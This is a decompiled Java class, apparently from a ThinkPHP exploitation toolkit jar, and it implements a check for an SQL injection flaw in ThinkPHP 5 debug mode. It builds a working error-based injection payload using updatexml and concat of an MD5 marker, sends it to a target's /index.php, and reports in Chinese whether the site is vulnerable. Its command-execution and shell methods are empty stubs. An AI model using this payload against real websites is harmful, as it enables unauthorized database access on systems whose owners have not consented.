/*    */ package dylan.exp;
/*    */ 
/*    */ import dylan.model.BaseExp;
/*    */ import dylan.model.Response;
/*    */ import dylan.tools.HttpTool;
/*    */ import java.util.HashMap;
/*    */ 
/*    */ public class tp5_debug_index_ids_sqli
/*    */   implements BaseExp {
/* 10 */   private String results = null;
/* 11 */   private HashMap<String, String> property = new HashMap<>();
/*    */ 
/*    */   
/*    */   public String vulCheck(String url) {
/* 15 */     url = url + "/index.php?ids[0,UpdAtexml(0,ConcAt(0xa,Md5(520)),0)]=1";
/* 16 */     this.property.put("Content-type", "application/x-www-form-urlencoded");
/* 17 */     Response response = HttpTool.get(url, this.property);
/* 18 */     if (response.getText().contains("cf67355a3333e6e143439161adc2d82")) {
/* 19 */       this.results = "[+] 目标存在" + getClass().getSimpleName() + " 漏洞";
/* 20 */       return this.results;
/*    */     } 
/* 22 */     if (response.getError() != null) {
/* 23 */       this.results = "[-] 检测漏洞" + getClass().getSimpleName() + "失败， " + response.getError();
/* 24 */       return this.results;
/*    */     } 
/* 26 */     this.results = "[-] 目标不存在" + getClass().getSimpleName() + "漏洞";
/* 27 */     return this.results;
/*    */   }
/*    */ 
/*    */   
/*    */   public String cmdExec(String url, String cmd) {
/* 32 */     this.property.put("Content-type", "application/x-www-form-urlencoded");
/* 33 */     return this.results;
/*    */   }
/*    */ 
/*    */   
/*    */   public String getShell(String url, String fileName, String content) {
/* 38 */     return this.results;
/*    */   }
/*    */ }


/* Location:              C:\Users\zyh\Desktop\ThinkPHP.V2.3.by蓝鲸.jar!\dylan\exp\tp5_debug_index_ids_sqli.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */